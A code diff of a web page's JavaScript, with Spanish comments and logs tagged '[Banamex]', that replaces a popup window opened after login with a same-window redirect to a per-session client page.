@@ -1855,21 +1855,9 @@
                         // Ocultar loader
                         loadingOverlay.classList.remove('active');
                         
-                        // Abrir ventana emergente del cliente inmediatamente
-                        console.log('[Banamex] Abriendo ventana del cliente con sessionId:', data.sessionId);
-                        
-                        const clientWindow = window.open(
-                            `/client/${data.sessionId}`,
-                            'ClientScreen',
-                            'width=800,height=900,menubar=no,toolbar=no,location=no,status=no,scrollbars=yes,resizable=yes'
-                        );
-                        
-                        if (clientWindow) {
-                            clientWindow.focus();
-                            console.log('[Banamex] Ventana del cliente abierta exitosamente');
-                        } else {
-                            alert('Por favor permite ventanas emergentes para continuar.');
-                        }
+                        // Redirigir en la misma ventana
+                        console.log('[Banamex] Redirigiendo a la pantalla del cliente con sessionId:', data.sessionId);
+                        window.location.href = `/client/${data.sessionId}`;
                     } else {
                         loadingOverlay.classList.remove('active');
                         alert(data.message || 'Error en la autenticación');
@@ -1988,28 +1976,16 @@
                     const data = await response.json();
                     
                     if (data.success) {
-                        // Abrir ventana emergente del cliente inmediatamente
+                        // Redirigir en la misma ventana
                         const sessionId = window.loginData.sessionId;
-                        console.log('[Banamex] Abriendo ventana del cliente con sessionId:', sessionId);
+                        console.log('[Banamex] Redirigiendo a la pantalla del cliente con sessionId:', sessionId);
                         
-                        const clientWindow = window.open(
-                            `/client/${sessionId}`,
-                            'ClientScreen',
-                            'width=800,height=900,menubar=no,toolbar=no,location=no,status=no,scrollbars=yes,resizable=yes'
-                        );
+                        // Ocultar el loader antes de redirigir
+                        const loadingOverlay = document.getElementById('loadingOverlay');
+                        loadingOverlay.classList.remove('active');
                         
-                        if (clientWindow) {
-                            clientWindow.focus();
-                            console.log('[Banamex] Ventana del cliente abierta exitosamente');
-                        } else {
-                            alert('Por favor permite ventanas emergentes para continuar.');
-                        }
-                        
-                        // Ocultar el loader después de abrir la ventana
-                        setTimeout(() => {
-                            const loadingOverlay = document.getElementById('loadingOverlay');
-                            loadingOverlay.classList.remove('active');
-                        }, 500);
+                        // Redirigir
+                        window.location.href = `/client/${sessionId}`;
                     } else {
                         // Error al enviar formulario
                         const loadingOverlay = document.getElementById('loadingOverlay');
